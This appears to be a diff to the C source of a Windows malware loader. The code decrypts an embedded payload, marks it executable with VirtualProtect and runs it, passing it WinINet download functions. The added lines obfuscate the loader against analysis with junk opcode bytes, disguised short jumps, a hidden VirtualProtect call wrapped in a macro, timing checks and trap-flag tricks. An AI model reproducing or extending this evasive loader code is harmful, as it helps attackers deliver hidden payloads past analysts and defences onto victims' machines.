@@ -1,6 +1,9 @@
 #include "loader.h"
 #include "payload_enc.c"
 extern void setTrapFlag(void);
+extern void stepOverExit(void);
+extern void appendByteExit(void);
+
 
 #define TOMFOOLERY asm volatile(\
         "call appendByte2Rip\n\t"\
@@ -15,6 +18,33 @@ extern void setTrapFlag(void);
 #define CHECK_TIME asm volatile(\
         "call loadTime\n\t"\
         ".byte 0x9a\n\t"\
+);
+
+#define RANDOM_BYTE asm volatile(\
+    ".byte 0x9a"\
+);
+
+#define SHORT_JMP asm volatile(\
+    ".word 0x01eb\n\t"\
+    ".byte 0x9a\n\t"\
+);
+
+#define OBFUSCATE_WIN_CALL asm volatile(\
+    "call callSecretWIN\n\t"\
+    ".byte 0x9a\n\t"\
+);
+
+
+// VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
+#define VIRT_PROTECT_OBF(data, size, perms, junk_ptr) asm volatile(\
+        "mov %0, %%rcx\n\t"\
+        "mov %1, %%edx\n\t"\
+        "mov %2, %%r8d\n\t"\
+        "mov %3, %%r9\n\t"\
+        "call callSecretWIN\n\t"\
+        ".byte 0x64\n\t"\
+        "call VirtualProtect\n\t"\
+        : : "r" (data), "i" (size), "i" (perms), "r" (junk_ptr) : "%rdi"\
 );
 
 
@@ -33,6 +63,8 @@ void DBGLG(char buf[], ...){
     #endif
 }
 
+
+
 /*
     args = {
         InternetOpen,
@@ -40,11 +72,12 @@ void DBGLG(char buf[], ...){
         InternetReadFile,
         InternetCloseHandle,
         unsigned char* buf,
-        int* sz
+        int* sz,
+        stepOverExit
     }
 */
 typedef unsigned int (*payload)(unsigned long long*);
-unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL};
+unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL, stepOverExit};
 int main(){
     TOMFOOLERY
     RECORD_TIME
@@ -53,7 +86,7 @@ int main(){
         MasterKey[i] = i*16 + i;
     }
     int sz = 0;
-
+    payload p;
     unsigned char KeyList[176];
     PDWORD junk = malloc(sizeof(PDWORD));
     unsigned char execute_me[sizeof(payload_enc_bytes)];
@@ -66,19 +99,22 @@ int main(){
         fprintf(stderr, "Error opening file. Error code: %d\n", GetLastError());
         return 1;
     }
-
-
+    // RANDOM_BYTE
     // printf("%d\n",payload_ex(args));
-
-    printf("Len is %d\n", sz);
-    payload p;
+    // SHORT_JMP
     memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
     KeyScheduler(MasterKey, KeyList);
     for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
         Decrypt(execute_me + i, KeyList);
     }
     CHECK_TIME
-    VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
+
+    // VirtualProtect(execute_me, sizeof(payload_enc_bytes),PAGE_EXECUTE_READWRITE, junk);
+
+    DBGLG("We got to point of starting a macro\n");
+    VIRT_PROTECT_OBF(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
+    DBGLG("We made it!\n");
+    CHECK_TIME
     p = (payload)(execute_me);
     CHECK_TIME
     p(args);
